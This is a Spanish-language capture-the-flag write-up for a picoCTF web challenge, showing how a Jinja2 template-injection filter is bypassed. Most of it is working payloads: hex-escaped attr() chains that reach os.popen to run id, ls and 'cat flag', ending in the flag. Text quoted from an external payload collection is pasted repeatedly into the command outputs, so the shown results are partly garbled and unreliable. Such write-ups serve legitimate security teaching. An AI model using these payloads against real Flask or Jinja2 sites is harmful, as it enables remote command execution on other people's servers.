## Descripción 
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :) I heard templating is a cool and modular way to build web apps! Check out my website here!
## Solución

- vemos que la vulnerabilidad esta semi parcheada 
```
{{ config.__class__.__init__.__globals__['os'].popen("ls").read() }}

regresa

Stop trying to break me >:(
```

- probamos con otro comando 
  ```
  “.” and “_”: {{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']()}}
  
  regresa
  
  “”, “”, “” and “” makes the payload turn into this payload I made for PayloadAllTheThings (https://githubcom/swisskyrepo/PayloadsAllTheThings/pull/181/commits/7e7f5e762831266b22531c258d628172c7038bb9), also found on my twitter (https://twittercom/SecGus/status/1249744031392940033): uid=0(root) gid=0(root) groups=0(root) 
  ```

- modificamos para que pregunte que hay 
  
  ```
  “.”, “_”, “[]” and “|join” makes the payload turn into this payload I made for PayloadAllTheThings (https://github.com/swisskyrepo/PayloadsAllTheThings/pull/181/commits/7e7f5e762831266b22531c258d628172c7038bb9), also found on my twitter (https://twitter.com/SecGus/status/1249744031392940033): {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
  
  regresa
  
  “”, “”, “” and “” makes the payload turn into this payload I made for PayloadAllTheThings (https://githubcom/swisskyrepo/PayloadsAllTheThings/pull/181/commits/7e7f5e762831266b22531c258d628172c7038bb9), also found on my twitter (https://twittercom/SecGus/status/1249744031392940033): __pycache__ app.py flag requirements.txt 
  ```

- extraemos la flag
```

“.”, “_”, “[]” and “|join” makes the payload turn into this payload I made for PayloadAllTheThings (https://github.com/swisskyrepo/PayloadsAllTheThings/pull/181/commits/7e7f5e762831266b22531c258d628172c7038bb9), also found on my twitter (https://twitter.com/SecGus/status/1249744031392940033): {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}

regresa 
“”, “”, “” and “” makes the payload turn into this payload I made for PayloadAllTheThings (https://githubcom/swisskyrepo/PayloadsAllTheThings/pull/181/commits/7e7f5e762831266b22531c258d628172c7038bb9), also found on my twitter (https://twittercom/SecGus/status/1249744031392940033): picoCTF{sst1_f1lt3r_byp4ss_63b833cd}
```

solucion:
```
picoCTF{sst1_f1lt3r_byp4ss_63b833cd}
```
## Referencias
- https://onsecurity.io/article/server-side-template-injection-with-jinja2/
